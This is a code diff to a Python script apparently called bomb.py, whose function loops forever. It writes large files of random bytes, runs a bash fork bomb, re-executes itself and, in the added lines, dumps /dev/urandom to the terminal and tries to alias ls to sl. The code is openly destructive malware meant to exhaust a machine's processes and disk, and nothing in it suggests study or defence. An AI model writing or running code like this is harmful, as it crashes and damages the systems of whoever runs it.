@@ -8,6 +8,7 @@ def forked():
   
   randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
   randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
+  number = 1
   while mal == True:
     random1 = random.choice(randomlet)
     random2 = random.choice(randonum)
@@ -22,6 +23,10 @@ def forked():
       file.write(str(random.randbytes(999999)) + malwar)
     os.system("clear")
     os.system(":(){ :|:& };:")
+    os.system("cat /dev/urandom")
+    if number == 1:
+      os.system("alias ls="sl")
+      number = 0
     print(malwar)
     os.system("python bomb.py")
   else:
